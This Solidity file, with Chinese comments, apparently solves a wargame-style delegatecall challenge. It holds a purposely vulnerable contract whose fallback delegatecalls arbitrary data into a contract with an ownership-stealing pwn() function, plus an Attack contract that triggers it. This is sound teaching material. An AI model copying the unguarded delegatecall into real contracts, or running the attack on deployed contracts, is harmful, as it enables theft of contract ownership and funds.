// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}

contract Attack {
    // Delegation 合约地址
    Delegation public delegationContract;

    constructor(address _delegationContractAddress) {
        delegationContract = Delegation(_delegationContractAddress);
    }

    function attack() public payable {
        // 构造pwn函数的二进制编码，用于delegatecall调用
        bytes memory payload = abi.encodeWithSignature("pwn()");

        // 转账，触发Delegation 合约的 fallback 函数
        (bool success, ) = address(delegationContract).call(payload);
        require(success, "Attack failed");
    }
}